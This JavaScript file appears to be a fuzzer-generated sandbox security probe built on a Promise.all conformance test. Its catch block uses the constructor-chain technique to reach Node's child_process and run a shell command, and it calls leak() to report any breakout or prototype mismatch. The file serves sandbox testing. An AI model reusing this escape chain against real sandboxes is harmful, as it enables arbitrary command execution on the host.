try {
    var p1 = new Promise(function () {
        throw () => {
            return () => {
            };
        };
    });
    var p2 = new Promise(function () {
    });
    var p3 = new Promise(function () {
    });
    var callCount = 0;
    var currentThis = p1;
    var nextThis = p2;
    var afterNextThis = p3;
    p1.then = p2.then = p3.then = function (a, b) {
        assert.sameValue(typeof a, 'function', 'type of first argument');
        assert.sameValue(a.length, 1, 'ES6 25.4.1.3.2: The length property of a promise resolve function is 1.');
        assert.sameValue(typeof b, 'function', 'type of second argument');
        assert.sameValue(b.length, 1, 'ES6 25.4.1.3.1: The length property of a promise reject function is 1.');
        assert.sameValue(arguments.length, 2, '`then` invoked with two arguments');
        assert.sameValue(this, currentThis, '`this` value');
        currentThis = nextThis;
        nextThis = afterNextThis;
        afterNextThis = null;
        callCount += 1;
    };
    Promise.all([
        p1,
        p2,
        p3
    ]);
    assert.sameValue(callCount, 3, '`then` invoked once for every iterated value');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}